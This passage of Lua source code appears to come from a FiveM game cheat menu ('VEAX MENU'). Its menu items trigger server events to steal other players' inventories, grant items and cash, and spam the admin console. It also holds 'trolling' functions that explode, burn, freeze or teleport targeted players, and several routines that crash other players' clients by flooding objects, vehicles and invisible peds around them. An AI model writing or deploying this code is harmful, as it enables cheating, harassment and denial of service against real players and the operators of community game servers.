                                end)
                            end},
                        }
                    },
                }
            },

            {
                name = "INVENTORY",
                hasTabs = true,
                tabs = {
                    {
                        name = "OX",
                        items = {
                            {isSeparator = true, separatorText = "OX Inventory"},
                            {name = "Open Player Inventory", type = "action", onClick = function()
                                Menu.OpenInput("Open Inventory", "Enter Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    Menu.SafeExec(string.format([[
                                        TriggerServerEvent('txsv:req:tpToPlayer', %d)
                                        Citizen.Wait(500)
                                        TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', '%d')
                                    ]], id, id))
                                end)
                                Menu.Toast("Opening inventory...", "blue")
                            end},
                            {name = "Steal Inventory", type = "action", onClick = function()
                                if Menu.StealNearestInventory then Menu.StealNearestInventory() end
                                Menu.Toast("Stealing inventory...", "yellow")
                            end},
                            {name = "Open Trunk Nearby", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local coords = GetEntityCoords(ped)
                                local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
                                if veh and DoesEntityExist(veh) then
                                    local plate = GetVehicleNumberPlateText(veh)
                                    TriggerServerEvent('inventory:server:OpenInventory', 'trunk', plate)
                                    Menu.Toast("Trunk opened!", "green")
                                else
                                    Menu.Toast("No vehicle nearby", "red")
                                end
                            end},
                            {name = "Open Glovebox Nearby", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local coords = GetEntityCoords(ped)
                                local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
                                if veh and DoesEntityExist(veh) then
                                    local plate = GetVehicleNumberPlateText(veh)
                                    TriggerServerEvent('inventory:server:OpenInventory', 'glovebox', plate)
                                    Menu.Toast("Glovebox opened!", "green")
                                else
                                    Menu.Toast("No vehicle nearby", "red")
                                end
                            end},
                        }
                    },
                    {
                        name = "CFW",
                        items = {
                            {isSeparator = true, separatorText = "CFW Inventory"},
                            {name = "Open CFW Inventory", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerEvent('cfw_inventory:open')]])
                                Menu.Toast("CFW Inventory opened", "green")
                            end},
                            {name = "CFW Give Item", type = "action", onClick = function()
                                Menu.OpenInput("CFW Give Item", "item_name:count (e.g. bread:10):", function(input)
                                    if not input then return end
                                    local item, count = input:match("([^:]+):?(%d*)")
                                    count = tonumber(count) or 1
                                    if item then
                                        Menu.SafeExec(string.format([[TriggerServerEvent('cfw_inventory:giveItem', '%s', %d)]], item, count))
                                        Menu.Toast("Gave " .. count .. "x " .. item, "green")
                                    end
                                end)
                            end},
                            {name = "CFW Drop All", type = "action", onClick = function()
                                Menu.SafeExec([[TriggerServerEvent('cfw_inventory:dropAll')]])
                                Menu.Toast("Dropped all items", "yellow")
                            end},
                        }
                    },
                    {
                        name = "Shop",
                        items = {
                                                        }
                    },
                    {
                        name = "90",
                        items = {
                            {name = "Unjail", type = "action", onClick = function()
                                Menu.SafeExec([[
                                    TriggerEvent("uU2zcTXqiWMJSP51qcuY8boTeiULEUL2dgL0oeOCCQv7Jo2vtQMtR6VB28oYqfrvcdaU5z4lCdvkVwk0FGI1cdOO849AjZxk7YsCTHFDdLnSMws6K5IwIW1a:8MxWgH8q78VeKhWLho8JzoYS9W3ZsBYO8Uk7LGkLL7jvyXa7BkkqOFW5XA8iLCEJRVe4kAzW52UkQlGA9NozKUohggrVhUV9SwoHRkfwmc5QX4U5amnFgGCF", 1)
                                    TriggerEvent("uU2zcTXqiWMJSP51qcuY8boTeiULEUL2dgL0oeOCCQv7Jo2vtQMtR6VB28oYqfrvcdaU5z4lCdvkVwk0FGI1cdOO849AjZxk7YsCTHFDdLnSMws6K5IwIW1a:gLhPK66wObgdH6XhBT0Oq1po5qdYElVkTMZ0uBNQjjigBUpv3cjvzLBmqUxJtGexazLVVbz7JH6ZHWiI115LHcVdkM5xIGxKDLcCJ2WujVwNP19fynKSGZz8")
                                ]])
                                Menu.Toast("Unjailed!", "green")
                            end},
                            {name = "Revive City", type = "action", onClick = function()
                                Menu.SafeExec([[
                                    TriggerEvent('f3rebLys7SpF4YAUDpCIaNA1JznUl2KoPNaoZkxWhraaFjBQxDa7pobgsCphwa4ZdrElCWM1HSivY9nhqZLTV7Nb2eIwLcfJ3Ihapv7LbhX1YiISDCBTo44n:qc58XdT4Y0xID2HAJrimsrcOGVP1dGW8HG01DIZ0xq1ngeFcUIiRUm6YcLghXrKE3emSy1Jv6YY6A27mWGNrgznbh4AvRZ6CGuPenCwPtV7UhyFkekP8QAH9')
                                ]])
                                Menu.Toast("City Revived!", "green")
                            end},
                            {name = "Uncuff", type = "action", onClick = function()
                                Menu.SafeExec([[
                                    TriggerEvent('esx_misc:handcuff')
                                ]])
                                Menu.Toast("Uncuffed!", "green")
                            end},
                            {name = "XP Booster", type = "toggle", value = false, onClick = function(state)
                                Menu.XPBoosterActive = state
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.XPBoosterActive do
                                            Menu.SafeExec([[
                                                TriggerEvent('lemon_xp:updateXPBar', {
                                                    lowerBound = 0,
                                                    upperBound = 300000,
                                                    previous = 0,
                                                    current = 2224000,
                                                    level = 155
                                                })
                                            ]])
                                            Citizen.Wait(2000)
                                        end
                                    end)
                                end
                            end},
                        }
                    },
                    {
                        name = "Old School",
                        items = {
                            {name = "Old School Cash", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local amount = 0
                                    while amount < 100000 do
                                        local randomID = "fastcash" .. math.random(1000, 9000)
                                        TriggerServerEvent('mad-vendrob:server:GiveRewards', randomID, vector3(0,0,0), "weapon_pistol")
                                        amount = amount + 50
                                        Citizen.Wait(0)
                                    end
                                    Menu.Toast("100K Added!", "green")
                                end)
                                Menu.Toast("Old School Cash started...", "yellow")
                            end},
                        }
                    },
                                    }
            },
            {
                name = "ONLINE",
                hasTabs = true,
                tabs = {
                    {
                        name = "Players",
                        items = {},
                        onOpen = function(tab)
                            tab.items = {}
                            table.insert(tab.items, {isSeparator = true, separatorText = "Connected Players"})

                            table.insert(tab.items, {name = ">> Refresh List <<", type = "action", onClick = function()
                                if tab.onOpen then tab.onOpen(tab) end
                                Menu.CurrentItem = 1
                                Menu.ItemScrollOffset = 0
                                Menu.Toast("List refreshed!", "green")
                            end})

                            local myPed = PlayerPedId()
                            local myC = GetEntityCoords(myPed)
                            local players = {}
                            for _, pid in ipairs(GetActivePlayers()) do
                                local tp = GetPlayerPed(pid)
                                local srvId = GetPlayerServerId(pid)
                                local name = GetPlayerName(pid) or "Unknown"
                                local dist = 0
                                local hp = 0
                                if DoesEntityExist(tp) then
                                    dist = math.floor(#(myC - GetEntityCoords(tp)))
                                    hp = math.max(0, GetEntityHealth(tp) - 100)
                                end
                                table.insert(players, {pid = pid, srvId = srvId, name = name, dist = dist, hp = hp, ped = tp})
                            end

                            table.sort(players, function(a, b) return a.dist < b.dist end)

                            table.insert(tab.items, {isSeparator = true, separatorText = #players .. " Players Online"})

                            for _, p in ipairs(players) do
                                local isMe = (p.ped == myPed)
                                local label = "[" .. p.srvId .. "] " .. p.name
                                if isMe then
                                    label = label .. " (YOU)"
                                else
                                    label = label .. " | " .. p.dist .. "m | HP:" .. p.hp
                                end

                                table.insert(tab.items, {name = label, type = "action", onClick = function()
                                    if isMe then
                                        Menu.Toast("That's you!", "yellow")
                                        return
                                    end
                                    Menu.TargetServerId = p.srvId
                                    Menu.TargetName = p.name
                                    Menu.TargetPid = p.pid

                                    tab.items = {}
                                    table.insert(tab.items, {isSeparator = true, separatorText = "Target: " .. p.name .. " [" .. p.srvId .. "]"})

                                    table.insert(tab.items, {name = "<< Back to Player List", type = "action", onClick = function()
                                        if tab.onOpen then tab.onOpen(tab) end
                                        Menu.CurrentItem = 1
                                        Menu.ItemScrollOffset = 0
                                    end})

                                    table.insert(tab.items, {isSeparator = true, separatorText = "Actions"})

                                    table.insert(tab.items, {name = "Teleport To", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            SetEntityCoords(PlayerPedId(), c.x, c.y, c.z, false, false, false, true)
                                            Menu.Toast("Teleported to " .. p.name, "green")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Spectate", type = "toggle", value = false, onClick = function(state)
                                        if state then
                                            local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                            if DoesEntityExist(tp) then
                                                NetworkSetInSpectatorMode(true, tp)
                                                Menu.Toast("Spectating " .. p.name, "blue")
                                            end
                                        else
                                            NetworkSetInSpectatorMode(false, PlayerPedId())
                                            Menu.Toast("Stopped spectating", "yellow")
                                        end
                                    end})

                                    table.insert(tab.items, {isSeparator = true, separatorText = "Trolling"})

                                    table.insert(tab.items, {name = "Explode", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            AddExplosion(c.x, c.y, c.z, 2, 100.0, true, false, 3.0, false)
                                            Menu.Toast(p.name .. " exploded!", "red")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Cage", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            local obj = CreateObject(GetHashKey("prop_gold_cont_01"), c.x, c.y, c.z - 1.0, true, true, false)
                                            FreezeEntityPosition(obj, true)
                                            Menu.Toast(p.name .. " caged!", "green")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Launch Up", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            NetworkRequestControlOfEntity(tp)
                                            Citizen.Wait(100)
                                            SetEntityVelocity(tp, 0.0, 0.0, 100.0)
                                            Menu.Toast(p.name .. " launched!", "yellow")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Freeze", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            NetworkRequestControlOfEntity(tp)
                                            Citizen.Wait(100)
                                            FreezeEntityPosition(tp, true)
                                            Menu.Toast(p.name .. " frozen!", "blue")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Set On Fire", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            StartScriptFire(c.x, c.y, c.z, 25, true)
                                            Menu.Toast(p.name .. " on fire!", "red")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Attach Campfire", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            local mdl = GetHashKey("prop_beach_fire")
                                            RequestModel(mdl)
                                            while not HasModelLoaded(mdl) do Citizen.Wait(0) end
                                            local obj = CreateObject(mdl, 0, 0, 0, true, true, false)
                                            AttachEntityToEntity(obj, tp, 0, 0.0, 0.0, -0.8, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            Menu.Toast("Fire attached to " .. p.name, "red")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Attach Dildo to Head", type = "action", onClick = function()
                                         local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                         if DoesEntityExist(tp) then
                                             local mdl = GetHashKey("prop_cs_dildo_01")
                                             RequestModel(mdl)
                                             while not HasModelLoaded(mdl) do Citizen.Wait(0) end
                                             local obj = CreateObject(mdl, 0, 0, 0, true, true, false)
                                             local bone = GetPedBoneIndex(tp, 31086)
                                             AttachEntityToEntity(obj, tp, bone, 0.0, 0.0, 0.2, 90.0, 0.0, 0.0, true, true, false, true, 1, true)
                                             Menu.Toast("Dildo attached to " .. p.name, "green")
                                         end
                                     end})

                                    table.insert(tab.items, {name = "Orbital Strike", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            Citizen.CreateThread(function()
                                                local c = GetEntityCoords(tp)
                                                for i = 1, 20 do
                                                    AddExplosion(c.x + math.random(-3,3), c.y + math.random(-3,3), c.z, 29, 200.0, true, false, 5.0, false)
                                                    Citizen.Wait(100)
                                                end
                                                Menu.Toast("Orbital strike on " .. p.name .. "!", "red")
                                            end)
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Surround Fire", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            for a = 0, 350, 20 do
                                                StartScriptFire(c.x + math.cos(math.rad(a)) * 4, c.y + math.sin(math.rad(a)) * 4, c.z, 25, true)
                                            end
                                            Menu.Toast("Fire ring on " .. p.name, "red")
                                        end
                                    end})

                                    table.insert(tab.items, {isSeparator = true, separatorText = "Crash"})

                                    table.insert(tab.items, {name = "Crash Player", type = "action", onClick = function()
                                        Citizen.CreateThread(function()
                                            local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                            if DoesEntityExist(tp) then
                                                local c = GetEntityCoords(tp)
                                                local models = {"prop_gold_cont_01","prop_windmill_01","prop_cs_satellite_dish"}
                                                for _, mn in ipairs(models) do
                                                    local m = GetHashKey(mn)
                                                    RequestModel(m)
                                                    while not HasModelLoaded(m) do Citizen.Wait(0) end
                                                    for j = 1, 30 do
                                                        local obj = CreateObject(m, c.x + math.random(-2,2), c.y + math.random(-2,2), c.z, true, true, false)
                                                        SetEntityAsNoLongerNeeded(obj)
                                                    end
                                                    SetModelAsNoLongerNeeded(m)
                                                end
                                                Menu.Toast("Crashing " .. p.name .. "!", "red")
                                            end
                                        end)
                                    end})

                                    table.insert(tab.items, {isSeparator = true, separatorText = "Risky"})

                                    table.insert(tab.items, {name = "Copy Appearance", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            ClonePedToTarget(tp, PlayerPedId())
                                            Menu.Toast("Copied " .. p.name .. "'s appearance!", "green")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Kick From Vehicle", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) and IsPedInAnyVehicle(tp, false) then
                                            local veh = GetVehiclePedIsIn(tp, false)
                                            Citizen.CreateThread(function()
                                                NetworkRequestControlOfEntity(veh)
                                                NetworkRequestControlOfEntity(tp)
                                                Citizen.Wait(100)
                                                SetVehicleDoorsLocked(veh, 1)
                                                SetVehicleEngineOn(veh, false, true, true)
                                                ClearPedTasksImmediately(tp)
                                                Citizen.Wait(50)
                                                if IsPedInAnyVehicle(tp, false) then
                                                    TaskLeaveVehicle(tp, veh, 0)
                                                end
                                                Citizen.Wait(200)
                                                if IsPedInAnyVehicle(tp, false) then
                                                    SetPedIntoVehicle(tp, veh, -2)
                                                    Citizen.Wait(100)
                                                    ClearPedTasksImmediately(tp)
                                                end
                                                Citizen.Wait(200)
                                                if IsPedInAnyVehicle(tp, false) then
                                                    SetVehicleEngineHealth(veh, -1.0)
                                                    SetVehicleUndriveable(veh, true)
                                                    ClearPedTasksImmediately(tp)
                                                end
                                                Menu.Toast(p.name .. " ejected!", "green")
                                            end)
                                        else Menu.Toast("Not in vehicle!", "red") end
                                    end})


                                    table.insert(tab.items, {name = "Teleport to Ocean", type = "action", onClick = function()
                                        local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                        if DoesEntityExist(tp) then
                                            NetworkRequestControlOfEntity(tp)
                                            Citizen.Wait(200)
                                            SetEntityCoords(tp, -3500.0, -3500.0, 0.0, false, false, false, true)
                                            Menu.Toast(p.name .. " sent to ocean!", "red")
                                        end
                                    end})

                                    table.insert(tab.items, {name = "Attach Vehicle", type = "selector", options = {
                                        "adder","zentorno","dump","trash","insurgent2","rhino","blimp","hydra",
                                        "lazer","buzzard","cargobob","titan","luxor","swift","volatus","besra",
                                        "duster","cuban800","mammatus","velum","stunt","havok","microlight","seabreeze",
                                        "tug","marquis","jetmax","tropic","dinghy","speeder","squalo","suntrap"
                                    }, selected = 1, onClick = function(sel, val)
                                        Citizen.CreateThread(function()
                                            local tp = GetPlayerPed(GetPlayerFromServerId(p.srvId))
                                            if not DoesEntityExist(tp) then return end
                                            local hash = GetHashKey(val)
                                            RequestModel(hash)
                                            local t = 0
                                            while not HasModelLoaded(hash) and t < 50 do Citizen.Wait(100) t = t + 1 end
                                            if HasModelLoaded(hash) then
                                                local c = GetEntityCoords(tp)
                                                local veh = CreateVehicle(hash, c.x, c.y, c.z + 3.0, 0.0, true, false)
                                                AttachEntityToEntity(veh, tp, 0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                Menu.Toast(val .. " attached to " .. p.name, "green")
                                            end
                                        end)
                                    end})

                                    table.insert(tab.items, {isSeparator = true, separatorText = "Triggers"})

                                    table.insert(tab.items, {name = "Console Spam", type = "toggle", value = false, onClick = function(state)
                                        Menu.ConsoleSpam = state
                                        Menu.RegisterFeature("Console Spam", state)
                                        if state then
                                            Citizen.CreateThread(function()
                                                while Menu.ConsoleSpam do
                                                    TriggerServerEvent("txAdmin:receiveCommand", "say", {args = {"^1[VEAX] OWNED BY VEAX MENU ^0"}})
                                                    Citizen.Wait(100)
                                                end
                                            end)
                                        end
                                    end})

                                    Menu.CurrentItem = 1
                                    Menu.ItemScrollOffset = 0
                                end})
                            end
                        end
                    },
                    {
                        name = "Crash",
                        items = {
                            {name = "Crash Player (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Crash", "Enter Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local tp = GetPlayerPed(GetPlayerFromServerId(id))
                                    if not DoesEntityExist(tp) then return end
                                    local c = GetEntityCoords(tp)
                                    Citizen.CreateThread(function()
                                        for i = 1, 50 do
                                            local hash = GetHashKey("prop_gold_cont_01")
                                            RequestModel(hash)
                                            while not HasModelLoaded(hash) do Citizen.Wait(0) end
                                            local obj = CreateObject(hash, c.x + math.random(-2,2), c.y + math.random(-2,2), c.z, true, true, false)
                                            SetEntityAsNoLongerNeeded(obj)
                                        end
                                        local ptfx = "scr_rcbarry2"
                                        RequestNamedPtfxAsset(ptfx)
                                        while not HasNamedPtfxAssetLoaded(ptfx) do Citizen.Wait(0) end
                                        for i = 1, 30 do
                                            UseParticleFxAssetNextCall(ptfx)
                                            StartParticleFxNonLoopedAtCoord("scr_exp_clown", c.x, c.y, c.z, 0.0, 0.0, 0.0, 50.0, false, false, false)
                                        end
                                    end)
                                end)
                            end},

                            {name = "Crash Nearest", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local myC = GetEntityCoords(myPed)
                                local best, bestPed, bestId = 999.0, nil, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp; bestId = GetPlayerServerId(pid) end
                                    end
                                end
                                if bestPed then
                                    local c = GetEntityCoords(bestPed)
                                    Citizen.CreateThread(function()
                                        for i = 1, 50 do
                                            local hash = GetHashKey("prop_gold_cont_01")
                                            RequestModel(hash)
                                            while not HasModelLoaded(hash) do Citizen.Wait(0) end
                                            CreateObject(hash, c.x + math.random(-2,2), c.y + math.random(-2,2), c.z, true, true, false)
                                        end
                                        local ptfx = "scr_rcbarry2"
                                        RequestNamedPtfxAsset(ptfx)
                                        while not HasNamedPtfxAssetLoaded(ptfx) do Citizen.Wait(0) end
                                        for i = 1, 30 do
                                            UseParticleFxAssetNextCall(ptfx)
                                            StartParticleFxNonLoopedAtCoord("scr_exp_clown", c.x, c.y, c.z, 0.0, 0.0, 0.0, 50.0, false, false, false)
                                        end
                                    end)
                                end
                            end},

                            {isSeparator = true, separatorText = "Advanced Crash"},

                            {name = "Sound Crash (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Sound Crash", "Enter Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local tp = GetPlayerPed(GetPlayerFromServerId(id))
                                    if not DoesEntityExist(tp) then return end
                                    local c = GetEntityCoords(tp)
                                    Citizen.CreateThread(function()
                                        for i = 1, 100 do
                                            local hash = GetHashKey("prop_parking_sign_1")
                                            RequestModel(hash)
                                            while not HasModelLoaded(hash) do Citizen.Wait(0) end
                                            local obj = CreateObject(hash, c.x, c.y, c.z + 50.0 + i, true, true, false)
                                            ApplyForceToEntity(obj, 1, 0.0, 0.0, -500.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                        end
                                    end)
                                end)
                            end},

                            {name = "Vehicle Crash (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Vehicle Crash", "Enter Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local tp = GetPlayerPed(GetPlayerFromServerId(id))
                                    if not DoesEntityExist(tp) then return end
                                    local c = GetEntityCoords(tp)
                                    Citizen.CreateThread(function()
                                        for i = 1, 30 do
                                            local models = {"adder","zentorno","t20","osiris","entityxf"}
                                            local m = GetHashKey(models[math.random(1, #models)])
                                            RequestModel(m)
                                            while not HasModelLoaded(m) do Citizen.Wait(0) end
                                            local veh = CreateVehicle(m, c.x + math.random(-5,5), c.y + math.random(-5,5), c.z + 10.0, math.random(0,360)*1.0, true, false)
                                            SetEntityAsNoLongerNeeded(veh)
                                            SetModelAsNoLongerNeeded(m)
                                        end
                                    end)
                                end)
                            end},

                            {isSeparator = true, separatorText = "Emote Crash"},

                            {name = "Emote Crash (Toggle)", type = "toggle", value = false, onClick = function(state)
                                Menu.EmoteCrashActive = state
                                if not state then return end
                                Citizen.CreateThread(function()
                                    local myPed = PlayerPedId()
                                    local animDicts = {
                                        "anim@mp_player_intcelebrationmale@knuckle_crunch",
                                        "anim@mp_player_intcelebrationmale@air_guitar",
                                        "anim@mp_player_intcelebrationmale@dj",
                                        "anim@mp_player_intcelebrationmale@air_synth",
                                        "anim@mp_player_intcelebrationmale@rock",
                                        "anim@mp_player_intcelebrationmale@shadow_boxing",
                                        "anim@mp_player_intcelebrationmale@salute",
                                        "anim@mp_player_intcelebrationmale@peace",
                                        "anim@mp_player_intcelebrationmale@slow_clap",
                                        "anim@mp_player_intcelebrationmale@wave",
                                        "anim@mp_player_intcelebrationmale@surrender",
                                        "anim@mp_player_intcelebrationmale@thumbs_up",
                                        "anim@mp_player_intcelebrationmale@shush",
                                        "mp_player_intcelebrationmale",
                                        "mp_player_intcelebrationfemale",
                                        "anim@mp_player_intcelebrationfemale@air_guitar",
                                        "anim@mp_player_intcelebrationfemale@dj",
                                        "anim@mp_player_intcelebrationfemale@peace",
                                        "anim@mp_player_intuppersalute",
                                        "missfbi3_party_d",
                                        "missfbi3_party_b",
                                        "special_ped@mountain_dancer@base",
                                        "anim@amb@nightclub@dancers@podium_dancers@",
                                        "anim@amb@nightclub@mini@dance@dance_solo@female@var_a@",
                                        "anim@amb@nightclub@mini@dance@dance_solo@male@var_a@",
                                        "rcmnigel1c",
                                        "rcmfanatic1celebrate",
                                    }
                                    local animNames = {"idle_a", "idle_b", "idle_c", "enter", "exit"}
                                    for _, dict in ipairs(animDicts) do
                                        RequestAnimDict(dict)
                                    end
                                    Citizen.Wait(500)
                                    while Menu.EmoteCrashActive do
                                        myPed = PlayerPedId()
                                        for i = 1, #animDicts do
                                            if not Menu.EmoteCrashActive then break end
                                            RequestAnimDict(animDicts[i])
                                            for _, aName in ipairs(animNames) do
                                                TaskPlayAnim(myPed, animDicts[i], aName, 1000.0, -1000.0, 0, 49, 0, false, false, false)
                                            end
                                        end
                                        Citizen.Wait(0)
                                    end
                                    ClearPedTasks(myPed)
                                end)
                            end},

                            {isSeparator = true, separatorText = "FTK Ped Crasher"},

                            {name = "FTK Crash (ID)", type = "action", onClick = function()
                                Menu.OpenInput("FTK Crash", "Enter Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local targetPid = GetPlayerFromServerId(id)
                                    local tp = GetPlayerPed(targetPid)
                                    if not DoesEntityExist(tp) then return end
                                    Citizen.CreateThread(function()
                                        local modelHash = GetHashKey("player_one")
                                        RequestModel(modelHash)
                                        local t = 0
                                        while not HasModelLoaded(modelHash) and t < 50 do Citizen.Wait(100) t = t + 1 end
                                        if not HasModelLoaded(modelHash) then return end
                                        local myPed = PlayerPedId()
                                        local spawned = {}
                                        local totalPeds = 110
                                        local batchSize = 6
                                        local iterations = math.ceil(totalPeds / batchSize)
                                        for iter = 1, iterations do
                                            tp = GetPlayerPed(targetPid)
                                            if not DoesEntityExist(tp) then break end
                                            local c = GetEntityCoords(tp)
                                            for b = 1, batchSize do
                                                local angle = math.random() * 6.2831
                                                local dist = math.random() * 4.5
                                                local sx = c.x + dist * math.cos(angle)
                                                local sy = c.y + dist * math.sin(angle)
                                                local ped = CreatePed(28, modelHash, sx, sy, c.z, math.random(0,359)*1.0, true, false)
                                                if DoesEntityExist(ped) then
                                                    SetEntityAlpha(ped, 0, false)
                                                    SetEntityVisible(ped, false, false)
                                                    FreezeEntityPosition(ped, true)
                                                    SetEntityCollision(ped, false, false)
                                                    SetEntityCompletelyDisableCollision(ped, false, false)
                                                    SetEntityInvincible(ped, true)
                                                    SetPedCanRagdoll(ped, false)
                                                    SetBlockingOfNonTemporaryEvents(ped, true)
                                                    local flags = {17, 128, 149, 223, 229, 281, 287, 292, 297, 301, 430, 435}
                                                    for _, f in ipairs(flags) do SetPedConfigFlag(ped, f, true) end
                                                    DisablePedPainAudio(ped, true)
                                                    SetPedSeeingRange(ped, 0.0)
                                                    SetPedHearingRange(ped, 0.0)
                                                    TaskWanderInArea(ped, sx, sy, c.z, 8.0, 8.0, 8.0)
                                                    SetPedAsNoLongerNeeded(ped)
                                                    spawned[#spawned+1] = ped
                                                end
                                            end
                                            Citizen.Wait(200)
                                        end
                                        SetModelAsNoLongerNeeded(modelHash)
                                        Citizen.Wait(3500)
                                        for _, e in ipairs(spawned) do
                                            if DoesEntityExist(e) then DeleteEntity(e) end
                                        end
                                    end)
                                end)
                            end},

                            {name = "FTK Crash (Nearest)", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local myPed = PlayerPedId()
                                    local myC = GetEntityCoords(myPed)
                                    local bestDist, bestPid = 999.0, nil
                                    for _, pid in ipairs(GetActivePlayers()) do
                                        if pid ~= PlayerId() then
                                            local tp = GetPlayerPed(pid)
                                            if DoesEntityExist(tp) then
                                                local d = #(myC - GetEntityCoords(tp))
                                                if d < bestDist then bestDist = d bestPid = pid end
                                            end
                                        end
                                    end
                                    if not bestPid then return end
                                    local modelHash = GetHashKey("player_one")
                                    RequestModel(modelHash)
                                    local t = 0
                                    while not HasModelLoaded(modelHash) and t < 50 do Citizen.Wait(100) t = t + 1 end
                                    if not HasModelLoaded(modelHash) then return end
                                    local spawned = {}
                                    for iter = 1, 19 do
                                        local tp = GetPlayerPed(bestPid)
                                        if not DoesEntityExist(tp) then break end
                                        local c = GetEntityCoords(tp)
                                        for b = 1, 6 do
                                            local angle = math.random() * 6.2831
                                            local dist = math.random() * 4.5
                                            local ped = CreatePed(28, modelHash, c.x + dist*math.cos(angle), c.y + dist*math.sin(angle), c.z, math.random(0,359)*1.0, true, false)
                                            if DoesEntityExist(ped) then
                                                SetEntityAlpha(ped, 0, false)
                                                SetEntityVisible(ped, false, false)
                                                FreezeEntityPosition(ped, true)
                                                SetEntityCollision(ped, false, false)
                                                SetEntityInvincible(ped, true)
                                                SetPedCanRagdoll(ped, false)
                                                SetBlockingOfNonTemporaryEvents(ped, true)
                                                for _, f in ipairs({17,128,149,223,229,281,287,292,297,301,430,435}) do SetPedConfigFlag(ped, f, true) end
                                                DisablePedPainAudio(ped, true)
                                                SetPedSeeingRange(ped, 0.0)
                                                TaskWanderInArea(ped, c.x, c.y, c.z, 8.0, 8.0, 8.0)
                                                SetPedAsNoLongerNeeded(ped)
                                                spawned[#spawned+1] = ped
                                            end
                                        end
                                        Citizen.Wait(200)
                                    end
                                    SetModelAsNoLongerNeeded(modelHash)
                                    Citizen.Wait(3500)
                                    for _, e in ipairs(spawned) do
                                        if DoesEntityExist(e) then DeleteEntity(e) end
                                    end
                                end)
                            end},

                            {name = "Crash All Nearby", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                Citizen.CreateThread(function()
                                    for _, pid in ipairs(GetActivePlayers()) do
                                        local tp = GetPlayerPed(pid)
                                        if tp ~= myPed and DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            for i = 1, 20 do
                                                local hash = GetHashKey("prop_gold_cont_01")
                                                RequestModel(hash)
                                                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                                                CreateObject(hash, c.x + math.random(-3,3), c.y + math.random(-3,3), c.z, true, true, false)
                                            end
                                        end
                                    end
                                end)
                            end},

                            {isSeparator = true, separatorText = "Ped Crash (Bots)"},

                            {name = "Ped Flood (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Ped Flood", "Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local targetPid = GetPlayerFromServerId(id)
                                    local tp = GetPlayerPed(targetPid)
                                    if not DoesEntityExist(tp) then Menu.Toast("Not found", "red") return end
                                    Citizen.CreateThread(function()
                                        local models = {"a_m_m_bevhills_01", "a_f_m_bevhills_01", "s_m_y_cop_01", "a_m_y_skater_01", "a_m_m_farmer_01", "a_f_y_tourist_01", "s_m_m_paramedic_01", "a_m_m_afriamer_01", "s_m_y_fireman_01", "a_m_y_runner_01", "a_m_y_hipster_01", "a_f_y_fitness_01"}
                                        local loaded = {}
